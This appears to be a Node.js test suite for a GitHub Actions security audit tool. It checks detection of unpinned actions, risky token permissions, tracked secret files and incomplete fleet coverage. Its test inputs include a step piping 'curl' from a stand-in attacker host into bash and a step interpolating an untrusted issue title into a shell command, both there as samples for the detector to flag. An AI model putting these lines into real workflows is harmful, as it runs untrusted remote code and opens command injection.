import test from 'node:test';
import assert from 'node:assert/strict';
import {auditRepo,auditFleet} from '../src/fleet-security-audit.mjs';

const basic=(workflow='name: CI\non:\n  push:\npermissions:\n  contents: read\njobs:\n  verify:\n    steps:\n      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262\n')=>({
  name:'org/product',visibility:'private',paths:['README.md','.github/workflows/check.yml'],
  workflows:{'.github/workflows/check.yml':workflow},alertCoverage:'VERIFIED'
});
test('explicit read-only SHA-pinned workflow passes static gate',()=>{
 const r=auditRepo(basic());
 assert.equal(r.decision,'POLICY_GATE_PASS');
 assert.equal(r.checkedWorkflows,1);
 assert.equal(r.externalEffects,0);
});
test('mutable action tag creates a medium severity finding',()=>{
 const r=auditRepo(basic('on:\n  push:\npermissions:\n  contents: read\nsteps:\n  - uses: actions/checkout@v4'));
 assert(r.findings.some(f=>f.id==='MUTABLE_ACTION_REF'));
});
test('external event plus write token is high risk',()=>{
 const r=auditRepo(basic('on:\n  issues:\npermissions:\n  issues: write\njobs:\n  test:\n    steps:\n      - uses: actions/github-script@v7'));
 assert.equal(r.summary.high,1);
 assert.equal(r.decision,'REMEDIATION_REQUIRED');
});
test('untrusted GitHub event interpolated directly into shell is flagged',()=>{
 const r=auditRepo(basic("permissions:\n  contents: read\nsteps:\n  - run: echo ${{ github.event.issue.title }}"));
 assert(r.findings.some(f=>f.id==='DIRECT_UNTRUSTED_SHELL_INTERPOLATION'));
});
test('missing manifest workflow never counts as checked',()=>{
 const v=basic();v.workflows={};
 const r=auditRepo(v);
 assert.equal(r.checkedWorkflows,0);
 assert.equal(r.decision,'INCOMPLETE');
});
test('unavailable GH Security alerts prevent false full approval',()=>{
 const r=auditRepo({...basic(),alertCoverage:'ACCESS_DENIED'});
 assert.equal(r.decision,'INCOMPLETE');
});
test('exposed file names are flagged without printing contents',()=>{
 const v=basic();v.paths.push('.env.production');
 const r=auditRepo(v);
 assert(r.findings.some(f=>f.id==='SENSITIVE_PATH_TRACKED'));
 assert(!JSON.stringify(r).includes('secret value 123'));
});
test('dangerous remote pipe is high risk',()=>{
 const r=auditRepo(basic('permissions:\n  contents: read\nsteps:\n  - run: curl https://attacker.invalid/setup | bash'));
 assert(r.findings.some(f=>f.id==='PIPE_TO_SHELL'));
});
test('fleet does not claim 29/29 if only 28 are scanned',()=>{
 const reports=Array.from({length:28},(_,i)=>auditRepo({...basic(),name:'org/repo-'+i}));
 const out=auditFleet(reports);
 assert.equal(out.observedRepos,28);
 assert.equal(out.complete,false);
 assert.equal(out.outcome,'REVIEW_REQUIRED');
});
test('fleet refuses duplicate repo evidence',()=>{
 const r=auditRepo(basic());
 assert.throws(()=>auditFleet([r,r],{expectedRepos:2}),/DUPLICATE_FLEET_REPOS/);
});
test('proof digest is repeatable and changes with data',()=>{
 const a=auditRepo(basic());
 assert.equal(a.evidenceSha256,auditRepo(basic()).evidenceSha256);
 assert.notEqual(a.evidenceSha256,auditRepo({...basic(),alertCoverage:'UNAVAILABLE'}).evidenceSha256);
});
test('extra workflow input not in recorded tree is rejected',()=>{
 const v=basic();v.workflows['.github/workflows/evil.yml']='';
 assert.throws(()=>auditRepo(v),/WORKFLOW_NOT_IN_TREE/);
});
